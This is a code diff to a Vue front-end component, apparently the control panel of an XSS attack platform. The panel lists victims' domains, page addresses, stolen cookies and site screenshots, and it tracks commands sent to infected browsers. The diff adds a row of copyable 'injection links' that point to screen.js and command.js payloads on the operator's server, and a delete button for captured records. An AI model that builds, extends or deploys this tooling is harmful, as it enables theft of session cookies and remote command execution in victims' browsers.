@@ -1,9 +1,8 @@
 import CatalogMixin from '../../components/catalog/MixinExpandableCatalogBase'
 import {Optional} from '../../utils/Optional'
 import LazyInput from '../../components/catalog/ComponentLazyInput'
-import {ajax_xss_info_list_search, ajax_xss_info_upadte_command} from '../../api/xss/xss_info_api'
-import {xss_type_enum} from '../../dictionary/xss_dictionary'
-
+import {ajax_xss_info_list_search, ajax_xss_info_upadte_command, ajax_xss_info_delete} from '../../api/xss/xss_info_api'
+import {xss_type_enum, xss_status_enum} from '../../dictionary/xss_dictionary'
 export default {
   name: 'comp_xss_catalog',
   mixins: [CatalogMixin],
@@ -15,15 +14,21 @@ export default {
     command_request_mode: {},
   }),
   computed: {
-    footer_can_turn_left () {
+    footer_can_turn_left() {
       return this.page <= 1 ? false : true
     },
-    footer_can_turn_right () {
+    footer_can_turn_right() {
       return this.page * this.rowsPerPage > this.dataCount ? false : true
+    },
+    server_ip() {
+      return this.$store.state.user.ip
+    },
+    user_id() {
+      return this.$store.state.user.id
     }
   },
   methods: {
-    render_search (h) {
+    render_search(h) {
       return h('div', {
         staticClass: 'q-mb-sm'
       }, [
@@ -43,7 +48,7 @@ export default {
       ])
     }
     ,
-    render_type_btn (h, data) {
+    render_type_btn(h, data) {
       return h('div', {
         staticClass: 'q-ml-md',
         style: {
@@ -67,32 +72,54 @@ export default {
         },)
       ])
     },
-    render_table_header (h) {
-      return h('thead', [
-        h('tr', [
-          // h('th', {staticClass: 'text-left',}, 'ID'),
-          h('th', {staticClass: 'text-left'}, '域名'),
-          h('th', {staticClass: 'text-left'}, '攻击类型'),
-          h('th', {staticClass: 'text-left'}, '地址'),
-          h('th', {staticClass: 'text-left'}, 'Cookie'),
-          h('th', {staticClass: 'text-left',}, '站点截图'),
-          h('th', {staticClass: 'text-left'}, '输入命令'),
-          h('th', {staticClass: 'text-left'}, '创建时间'),
+    render_table_header(h) {
+      if (this.xss_type === 2) {
+        return h('thead', [
+          h('tr', [
+            h('th', {staticClass: 'text-left'}, '域名'),
+            h('th', {staticClass: 'text-left'}, '攻击类型'),
+            h('th', {staticClass: 'text-left'}, '地址'),
+            h('th', {staticClass: 'text-left'}, 'Cookie'),
+            h('th', {staticClass: 'text-left',}, '站点截图'),
+            h('th', {staticClass: 'text-left'}, '创建时间'),
+            h('th', {staticClass: 'text-left'}, '操作'),
+          ])
         ])
-      ])
+      } else if (this.xss_type === 3) {
+        return h('thead', [
+          h('tr', [
+            h('th', {staticClass: 'text-left'}, '域名'),
+            h('th', {staticClass: 'text-left'}, '攻击类型'),
+            h('th', {staticClass: 'text-left'}, '地址'),
+            h('th', {staticClass: 'text-left'}, 'Cookie'),
+            h('th', {staticClass: 'text-left'}, '状态'),
+            h('th', {staticClass: 'text-left'}, '输入命令'),
+            h('th', {staticClass: 'text-left'}, '创建时间'),
+            h('th', {staticClass: 'text-left'}, '操作'),
+          ])
+        ])
+      } else {
+        return h('thead', [
+          h('tr', [
+            h('th', {staticClass: 'text-left'}, '域名'),
+            h('th', {staticClass: 'text-left'}, '攻击类型'),
+            h('th', {staticClass: 'text-left'}, '地址'),
+            h('th', {staticClass: 'text-left'}, 'Cookie'),
+            h('th', {staticClass: 'text-left',}, '站点截图'),
+            h('th', {staticClass: 'text-left'}, '状态'),
+            h('th', {staticClass: 'text-left'}, '输入命令'),
+            h('th', {staticClass: 'text-left'}, '创建时间'),
+            h('th', {staticClass: 'text-left'}, '操作'),
+          ])
+        ])
+      }
     },
-    render_table_row (h, data) {
+    render_table_row(h, data) {
       return h('tr', {
         style: {
           height: '120px'
         }
       }, [
-        // h('td', {staticClass: 'text-left'}, [
-        //   h('div', {
-        //     style: {
-        //       fontWeight: '700'
-        //     }
-        //   }, data.id)]),
         h('td', {staticClass: 'text-left'}, [
           h('div', {
             style: {
@@ -124,7 +151,7 @@ export default {
               whiteSpace: 'normal'
             }
           }, Optional.ofNullable(decodeURIComponent(data.cookie)).orElse('--'))]),
-        h('td', {staticClass: 'text-left'}, [
+        this.xss_type === 2 || this.xss_type === 0 ? h('td', {staticClass: 'text-left'}, [
           data.img != null ? h('div', {
             staticClass: 'q-ma-sm',
             style: {
@@ -143,9 +170,16 @@ export default {
             attrs: {
               src: data.img
             }
-          })]) : null]),
-        h('td', {staticClass: 'text-left'}, [
-          data.type === xss_type_enum['3'].type ?
+          })]) : null]) : null,
+        this.xss_type === 3 || this.xss_type === 0 ? h('td', {staticClass: 'text-left'}, [
+          h('div', {
+            staticClass: xss_status_enum[data.status].color || 'text-tertiary',
+            style: {
+              fontWeight: '700'
+            }
+          }, Optional.ofNullable(xss_status_enum[data.status].label).orElse('--'))]) : null,
+        this.xss_type === 3 || this.xss_type === 0 ? h('td', {staticClass: 'text-left'}, [
+          data.type === xss_type_enum['3'].type && data.status === 1 ?
             h('div', {
               staticClass: 'nowrap row ellipsis  pp-radius-1 pp-border-5',
               style: {
@@ -206,16 +240,33 @@ export default {
                 }
               })])
             ]) : null
-        ]),
+        ]) : null,
         h('td', {staticClass: 'text-left'}, [
           h('div', {
             style: {
               fontWeight: '700'
             }
           }, Optional.ofNullable(data.create_time).orElse('--'))]),
+        h('td', {staticClass: 'text-left'}, [
+          h('q-btn', {
+            staticClass: 'text-primary text-weight-bold cursor-pointer',
+            props: {
+              label: '删除',
+              flat: true,
+            },
+            on: {
+              click: () => {
+                ajax_xss_info_delete(data.id).then(d => {
+                  this.refresh_catalog()
+                }).catch(e => {
+
+                })
+              }
+            }
+          })]),
       ])
     },
-    render_table_body (h) {
+    render_table_body(h) {
       // 参数属性添加：
       this.dataList.map(data => {
         this.command_request_mode[data.id] = data.command
@@ -229,7 +280,7 @@ export default {
         ]
       )])
     },
-    render_table_footer (h) {
+    render_table_footer(h) {
       return h('div', {
         staticClass: 'q-table-bottom nowrap row items-center justify-end',
         style: {
@@ -279,7 +330,7 @@ export default {
         ])
       ])
     },
-    render_xss_list_table (h) {
+    render_xss_list_table(h) {
       return h('table', {
         staticClass: 'q-table q-table-horizontal-separator no-shadow'
       }, [
@@ -287,12 +338,58 @@ export default {
         this.render_table_body(h),
       ])
     },
-
-    request () {
+    render_xss_template_div(h) {
+      return h('div', {
+        staticClass: 'text-left font-14 bg-grey-1 q-pa-md text-tertiary text-weight-bold row no-wrap',
+        style: {
+          border: '1px solid var(--q-color-grey-3)'
+        }
+      }, [
+        h('div', {
+          staticClass: 'row no-wrap q-mr-lg'
+        }, [
+          h('span', {
+            staticClass: 'font-12'
+          }, ['截图攻击注入链接：']),
+          h('span', {
+            staticClass: 'text-primary text-weight-bold cursor-pointer',
+            on: {
+              click: () => {
+                this.copy_value('http://' + this.$store.state.user.ip + ':8080/api/xss/screen.js?id=' + this.user_id)
+              }
+            }
+          }, ['http://' + this.$store.state.user.ip + ':8080/api/xss/screen.js?id=' + this.user_id]),
+        ]),
+        h('div', {
+          staticClass: 'row no-wrap q-ml-lg'
+        }, [
+          h('span', {
+            staticClass: 'font-12'
+          }, ['命令攻击注入链接：']),
+          h('span', {
+            staticClass: 'text-primary text-weight-bold cursor-pointer',
+            on: {
+              click: () => {
+                this.copy_value('http://' + this.$store.state.user.ip + ':8080/api/xss/command.js?id=' + this.user_id)
+              }
+            }
+          }, ['http://' + this.$store.state.user.ip + ':8080/api/xss/command.js?id=' + this.user_id]),
+        ]),
+        h('div', {}, [])
+      ])
+    },
+    copy_value(value) {
+      this.$copyText(value).then(() => {
+        this.$q.ok('已经复制到粘贴板！')
+      }, () => {
+        this.$q.err('复制失败！')
+      })
+    },
+    request() {
       this.refresh_catalog()
     }
     ,
-    refresh_catalog () {
+    refresh_catalog() {
       ajax_xss_info_list_search(this.search_key, this.page, this.xss_type)
         .then(d => {
           this.dataList = d.data.dataList || []
@@ -300,7 +397,7 @@ export default {
         })
         .catch(() => this.$q.err('获取XSS列表异常'))
     },
-    showImgModal (data) {
+    showImgModal(data) {
       this.$q.ppDialogBase(
         h => h('div', {
             staticClass: 'bg-grey-3 relative-position pp-radius-1',
@@ -323,15 +420,7 @@ export default {
               style: {
                 transform: 'translateY(85%)'
               }
-            }, [
-              // h('div', {
-              //   staticClass: ' bg-dark text-white text-weight-bold font-14 q-pl-sm q-pr-sm pp-radius-5 flex no-wrap items-center',
-              //   style: {lineHeight: '24px', border: '2px solid white'}
-              // }, [
-              //   h('div', {staticClass: 'q-mr-md', style: {whiteSpace: 'nowrap'}}, data.domain),
-              //   h('div', {staticClass: 'q-mr-md', style: {whiteSpace: 'nowrap'}}, data.create_time),
-              // ])
-            ])
+            }, [])
           ]
         ),
         {noBackdropDismiss: false, noEscDismiss: false}
@@ -339,7 +428,7 @@ export default {
     },
   }
   ,
-  render (h) {
+  render(h) {
     return h('div', {staticClass: 'q-ml-md q-mr-md'}, [
       h('div', {staticClass: 'row col-12 flex q-pt-md'}, [
         this.render_search(h),
@@ -350,6 +439,7 @@ export default {
             this.render_type_btn(h, xss_type_enum[key])
           ])]),
       ]),
+      this.render_xss_template_div(h),
       this.render_xss_list_table(h),
       this.render_table_footer(h)
     ])
